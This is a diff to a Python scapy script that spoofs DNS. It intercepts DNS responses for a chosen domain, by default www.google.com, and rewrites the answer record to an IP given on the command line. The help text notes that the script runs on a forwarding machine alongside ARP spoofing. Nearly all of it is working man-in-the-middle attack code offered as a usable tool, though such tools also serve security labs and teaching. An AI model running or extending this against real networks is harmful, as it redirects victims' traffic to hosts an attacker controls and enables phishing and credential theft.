@@ -6,22 +6,41 @@ from scapy.layers.dns import DNSRR, DNS, DNSQR
 import argparse
 import os
 
-MY_IP = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
-TARGET = 'www.google.com' #DEFAULT TARGET
+TARGET = get_if_addr(conf.iface) #IP of DEFAULT INTERFACE
+DOMAIN = 'www.google.com' #DEFAULT DOMAIN
+
+class NoIPFormat(Exception):
+    pass
+
+def check_format_IP(network):
+    #params[0]=IP 
+    #params[1]=number of bits of netmask
+   
+    IP_numbers = network.split('.')
+    
+    if not len(IP_numbers)==4:
+        raise NoIPFormat()
+    else:
+        for num in IP_numbers:
+            if(int(num)>255 or int(num)<0):
+                raise NoIPFormat
+
+    return network
 
 #Process each packet
 def process_packet(packet):
+    global DOMAIN, TARGET
     IP_pkt = IP(packet.get_payload())
 
-    #It's a DNS Response
+    #It's a DNS Response (DNS Record Route)
     if(IP_pkt.haslayer(DNSRR)):
         #Name to be translated through DNS Query Record
         domain = IP_pkt[DNSQR].qname
 
-        #DNS resolution response for TARGET domain
-        if TARGET in str(domain):
+        #DNS resolution response for DOMAIN domain
+        if DOMAIN in str(domain):
             print("Spoofing target")
-            answer = DNSRR(rrname=domain, rdata=MY_IP)
+            answer = DNSRR(rrname=domain, rdata=TARGET)
             IP_pkt[DNS].an = answer
             #Only 1 DNS record (only 1 IP related to target)
             IP_pkt[DNS].ancount = 1
@@ -39,23 +58,36 @@ def process_packet(packet):
 
 #Parser of command line argument
 def args_parser():
-    global MY_IP, TARGET
+    global TARGET, DOMAIN
     #Parser of command line arguments
     parser = argparse.ArgumentParser()
     #Initialization of needed arguments
     parser.add_argument("-local", "-l", dest="local", help="If specified, IPTABLES updated to run program on local. Otherwise it works on forward machine (e.g. with arp spoofing).", action='store_true')
     parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
-    parser.add_argument("-target", "-target", dest="target", help="Target domain of DNS spoofing")
+    parser.add_argument("-domain", "-d", dest="domain", help="Domain on which DNS spoofing is performed")
+    parser.add_argument("-target", "-t", dest="target", help="IP address to substitute in DNS Record Route of specified domain")
 
     #Parse command line arguments
     args = parser.parse_args()
 
     #Check if the name of the network interface and the target domain have been specified
     if args.interface:
-        MY_IP = get_if_addr(args.interface)
+        #If specified interface, no specification of domain
+        if args.target:
+            parser.print_help()
+            exit(1)
+        else:
+            TARGET = get_if_addr(args.interface)
 
-    if args.target:
-        TARGET = args.target
+    try:
+        if args.target:
+            TARGET = check_format_IP(args.target)
+    except NoIPFormat:
+        parser.print_help()
+        exit(1)
+
+    if args.domain:
+        DOMAIN = args.domain
 
     return args.local
 
